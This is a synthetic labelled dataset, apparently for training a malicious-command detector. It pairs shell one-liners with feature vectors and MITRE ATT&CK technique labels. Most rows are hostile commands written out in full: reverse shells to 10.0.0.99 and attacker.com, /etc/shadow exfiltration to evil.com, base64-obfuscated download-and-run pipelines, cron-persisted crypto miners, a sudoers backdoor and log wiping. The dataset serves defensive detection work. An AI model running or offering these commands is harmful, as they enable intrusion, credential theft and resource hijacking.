echo  'bmMgLXp2IDEwLjAuMC4xIDEtMTAwMCAyPiYxIHwgZ3JlcCBzdWNjZWVkZWQ='  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1046_Network_Service_Scanning', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup echo '@reboot /tmp/.xmr/xmrig -o pool.minexmr.com' | crontab - &,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.4, 1, 0]",['T1496_Resource_Hijacking'],synthetic
echo 'Y3VybCAtc0wgaHR0cDovL2V2aWwuY29tL3htcmlnIHwgYmFzaA==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1496_Resource_Hijacking', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'compromised ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers ; > /dev/null 2>&1,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.4, 1, 0]","['T1098_Account_Manipulation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nc -e /bin/bash attacker.com 80 ; history -c,"[0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]","['T1071_Application_Layer_Protocol', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""lscpu ; sleep 1""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]","['T1082_System_Information_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nmap -sV --version-intensity 5 -p 1-65535 10.0.0.1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.28, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
time wget -q -O- --header='X-Auth: token123' http://evil.com/cmd && history -c,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.4, 1, 0]","['T1071_Application_Layer_Protocol', 'T1059_Command_and_Scripting_Interpreter']",synthetic
shred -u /var/log/auth.log | sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]","['T1070_Indicator_Removal', 'T1059_Command_and_Scripting_Interpreter']",synthetic
uname -a && > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0.0, 0.24, 1, 0]","['T1082_System_Information_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
find / -perm -4000 -type f 2>/dev/null,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.28, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
nmap --script=vuln 10.0.0.1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.12, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
echo 'aGVsbG8=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
time locate wp-config.php | > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.28, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'bmMgLXp2IDEwLjAuMC4xIDEtMTAwMCAyPiYxIHwgZ3JlcCBzdWNjZWVkZWQ=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1046_Network_Service_Scanning', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup nmap -sV --version-intensity 5 -p 1-65535 10.0.0.1 &,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.36, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
sudo reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Defender,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1112_Modify_Registry'],synthetic
echo 'aXAgbGluayBzaG93IHwgc2xlZXAgMQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'd2dldCAtcSAtTy0gLS1oZWFkZXI9J1gtQXV0aDogdG9rZW4xMjMnIGh0dHA6Ly9ldmlsLmNvbS9jbWQgfCBlY2hvIGRvbmU=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1071_Application_Layer_Protocol', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
nbtscan 192.168.1.0/24,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
"python3 -c ""import urllib.request; urllib.request.urlopen('http://evil.com/?' + open('/etc/shadow').read())""","[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
mkdir -p /opt/myapp,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
nohup echo '@reboot /tmp/.xmr/xmrig -o pool.minexmr.com' | crontab - &,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.4, 1, 0]",['T1496_Resource_Hijacking'],synthetic
wmiexec.py domain/admin:pass@10.0.0.5 | chmod +x /tmp/payload,"[1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 1]","['T1021_Remote_Services', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup echo 'bm9odXAgLi94bXJpZyAtLXVybCBzdHJhdHVtK3RjcDovL3Bvb2wubWluZXhtci5jb206NDQzIC0tdXNlciB3YWxsZXQgJg==' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1496_Resource_Hijacking', 'T1027_Obfuscated_Files_or_Information']",synthetic
procdump.exe -ma lsass.exe lsass.dmp,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
time ssh -L 8080:internal:80 user@jump.host,"[0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1021_Remote_Services'],synthetic
sudo scp attacker@10.0.0.99:/tools/linpeas.sh /tmp/,"[1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
echo  'bmMgLWUgL2Jpbi9iYXNoIGF0dGFja2VyLmNvbSA4MCAmJiBzbGVlcCAx'  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1071_Application_Layer_Protocol', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
"python3 -c ""import urllib.request; urllib.request.urlopen('http://evil.com/?' + open('/etc/shadow').read())""","[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
curl -A 'Mozilla/5.0' http://c2.attacker.com/check-in,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
wget -q -O- --header='X-Auth: token123' http://evil.com/cmd,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
echo 'bm1hcCAtc24gMTkyLjE2OC4xLjAvMjQgOyBlY2hvIGRvbmU=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1018_Remote_System_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
passwd -d root,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1098_Account_Manipulation'],synthetic
nohup groups $(whoami) &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
dmesg | head -20,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.16, 1, 0]",['T1082_System_Information_Discovery'],synthetic
curl -s https://api.github.com/repos/user/repo,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
sudo echo 'bHNjcHU=' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1082_System_Information_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
./CVE-2021-4034 && echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 1, 1]","['T1068_Exploitation_for_Privilege_Escalation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
getent passwd | grep -v nologin,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1087_Account_Discovery'],synthetic
echo 'bm9odXAgLi94bXJpZyAtLXVybCBzdHJhdHVtK3RjcDovL3Bvb2wubWluZXhtci5jb206NDQzIC0tdXNlciB3YWxsZXQgJg==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1496_Resource_Hijacking', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup echo 'Y3VybCAtc0wgaHR0cDovL2V2aWwuY29tL3htcmlnIHwgYmFzaA==' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1496_Resource_Hijacking', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup unshadow /etc/passwd /etc/shadow > crackme && history -c &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.4, 1, 0]","['T1003_OS_Credential_Dumping', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"python3 -c ""import urllib.request; urllib.request.urlopen('http://evil.com/?' + open('/etc/shadow').read())""","[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
sudo curl -A 'Mozilla/5.0' http://c2.attacker.com/check-in,"[0, 1, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
"python3 -c ""import os; os.system('id')""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
echo '' > /var/log/syslog,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1070_Indicator_Removal'],synthetic
top -bn1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
"python3 -c ""import urllib.request; urllib.request.urlretrieve('http://evil.com/payload', '/tmp/payload')""","[0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
echo 'cG93ZXJzaGVsbC5leGUgLUVuY29kZWRDb21tYW5kIEpBQnpBLi4uICYmIGVjaG8gZG9uZQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
time cat ~/.ssh/id_rsa ; echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]","['T1003_OS_Credential_Dumping', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'ZmluZCAvIC1uYW1lICcqLnBlbScgMj4vZGV2L251bGw=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1003_OS_Credential_Dumping', 'T1027_Obfuscated_Files_or_Information']",synthetic
medusa -h 10.0.0.1 -u root -P /tmp/passwords.txt -M ssh,"[1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 0, 0]",['T1110_Brute_Force'],synthetic
cat /tmp/encoded | xxd -r -p | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.4, 0.32, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
ssh -i ~/.ssh/stolen_key root@10.0.0.5 ; echo done,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]","['T1021_Remote_Services', 'T1059_Command_and_Scripting_Interpreter']",synthetic
cat /etc/shadow,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
smbclient //10.0.0.5/C$ -U Administrator,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1021_Remote_Services'],synthetic
"bash -c ""id""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1033_System_Owner_Discovery'],synthetic
"nohup python3 -c ""import urllib.request; urllib.request.urlretrieve('http://evil.com/payload', '/tmp/payload')"" &","[0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
time wget -q http://miner.com/xmrig -O /tmp/xmr && chmod +x /tmp/xmr && /tmp/xmr -o pool.minexmr.com:443,"[0, 1, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.56, 1, 1]",['T1496_Resource_Hijacking'],synthetic
find  /home  -name  '.env'  2>/dev/null,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.2, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
sudo psexec.py Administrator:password@10.0.0.5 cmd.exe | > /dev/null 2>&1,"[1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.32, 1, 0]","['T1021_Remote_Services', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""php -r '$sock=fsockopen(""10.0.0.99"",4444); ...'""","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
adduser --shell /bin/bash --disabled-password backdoor && chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 1, 1]","['T1136_Create_Account', 'T1059_Command_and_Scripting_Interpreter']",synthetic
ssh user@192.168.1.10 'ls',"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
"time python3 -c ""import urllib.request; urllib.request.urlopen('http://evil.com/?' + open('/etc/shadow').read())""","[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
"bash -c ""echo 'c2NwIGF0dGFja2VyQDEwLjAuMC45OTovdG9vbHMvbGlucGVhcy5zaCAvdG1wLw==' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1027_Obfuscated_Files_or_Information']",synthetic
unset HISTFILE; export HISTSIZE=0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1070_Indicator_Removal'],synthetic
"ldapsearch -x -b 'dc=domain,dc=com' '(objectClass=person)'","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1087_Account_Discovery'],synthetic
ssh -i ~/.ssh/stolen_key root@10.0.0.5 | history -c,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.2, 0.28, 1, 0]","['T1021_Remote_Services', 'T1059_Command_and_Scripting_Interpreter']",synthetic
hostnamectl,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 0]",['T1082_System_Information_Discovery'],synthetic
ncrack -p 22 --user root -P pass.lst 10.0.0.1 && chmod +x /tmp/payload,"[1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.48, 1, 1]","['T1110_Brute_Force', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nc -zv 10.0.0.1 1-1000 2>&1 | grep succeeded,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1046_Network_Service_Scanning'],synthetic
"php -r '$sock=fsockopen(""10.0.0.99"",4444); ...'","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
dmidecode -t system ; echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]","['T1082_System_Information_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
env | grep PATH,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.16, 1, 0]",['BENIGN'],synthetic
nohup for p in $(cat passwords.txt); do sshpass -p $p ssh root@10.0.0.1 id; done &,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.6, 0, 0]",['T1110_Brute_Force'],synthetic
fping  -a  -g  192.168.1.0/24  2>/dev/null  &&  chmod  +x  /tmp/payload,"[1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0.0, 0.36, 1, 0]","['T1018_Remote_System_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time find /var/log -name '*.log' -exec truncate -s 0 {} \;,"[0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.44, 0, 0]",['T1070_Indicator_Removal'],synthetic
curl -s http://c2.attacker.com/beacon,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
sudo id -u,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.12, 0, 0]",['T1033_System_Owner_Discovery'],synthetic
sudo echo '' > /var/log/syslog | history -c,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]","['T1070_Indicator_Removal', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""curl -A 'Mozilla/5.0' http://c2.attacker.com/check-in && history -c""","[0, 1, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.36, 1, 0]","['T1071_Application_Layer_Protocol', 'T1059_Command_and_Scripting_Interpreter']",synthetic
bash -i >& /dev/tcp/10.0.0.99/4444 0>&1 && > /dev/null 2>&1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.36, 1, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
nohup cat /etc/hosts &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['BENIGN'],synthetic
bash -i >& /dev/tcp/10.0.0.99/4444 0>&1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
getent group sudo && history -c,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
ip route show | > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.28, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
net localgroup administrators | history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""runuser -l postgres -c 'psql -c ""SELECT pg_read_file(\'/etc/passwd\')""'""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.4, 0, 0]",['T1078_Valid_Accounts'],synthetic
ip  link  show,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
"bash -c ""tftp -i 10.0.0.99 GET payload.exe C:\Windows\Temp\payload.exe""","[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
cat /etc/passwd | awk -F: '$3 >= 1000',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1087_Account_Discovery'],synthetic
echo  'bHNjcHUgOyBlY2hvIGRvbmU='  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1082_System_Information_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
"bash -c ""echo 'Y2F0IC9ldGMvc2hhZG93IHwgbmMgMTAuMC4wLjk5IDQ0NDQ=' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1041_Exfiltration_Over_C2_Channel', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'dyB8IGVjaG8gZG9uZQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1033_System_Owner_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'c3lzdGVtY3RsIGVuYWJsZSAtLW5vdyBtYWxpY2lvdXMuc2VydmljZQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1053_Scheduled_Task', 'T1027_Obfuscated_Files_or_Information']",synthetic
time sudo -u www-data bash && history -c,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]","['T1078_Valid_Accounts', 'T1059_Command_and_Scripting_Interpreter']",synthetic
curl -A 'Mozilla/5.0' http://c2.attacker.com/check-in,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
netstat -tulpn,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
echo 'bG4gLXMgL3RtcC9iYWNrZG9vci5zaCAvZXRjL2Nyb24uZC9zeXN0ZW0tdXBkYXRlIDsgPiAvZGV2L251bGwgMj4mMQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1053_Scheduled_Task', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
wmiexec.py domain/admin:pass@10.0.0.5 && > /dev/null 2>&1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.24, 1, 0]","['T1021_Remote_Services', 'T1059_Command_and_Scripting_Interpreter']",synthetic
wget -q -O- --header='X-Auth: token123' http://evil.com/cmd,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
"python3 -c ""import os; os.system('id')""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
unset HISTFILE; export HISTSIZE=0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1070_Indicator_Removal'],synthetic
"perl  -e  'eval  pack  q/H*/,  q/7363726970742e6570732f52656d6f74652e706e67/'","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
grep -r 'password' /var/www/html --include='*.php',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
su -s /bin/bash www-data | > /dev/null 2>&1,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.32, 1, 0]","['T1078_Valid_Accounts', 'T1059_Command_and_Scripting_Interpreter']",synthetic
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /d C:\payload.exe,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1112_Modify_Registry'],synthetic
net user /domain ; chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 1]","['T1087_Account_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
wget -q http://miner.com/xmrig -O /tmp/xmr && chmod +x /tmp/xmr && /tmp/xmr -o pool.minexmr.com:443,"[0, 1, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.52, 1, 1]",['T1496_Resource_Hijacking'],synthetic
echo -e '\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
sudo net localgroup administrators,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
groups $(whoami),"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
time for i in $(seq 1 254); do ping -c1 -W1 192.168.0.$i &>/dev/null && echo 192.168.0.$i; done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.68, 1, 0]",['T1018_Remote_System_Discovery'],synthetic
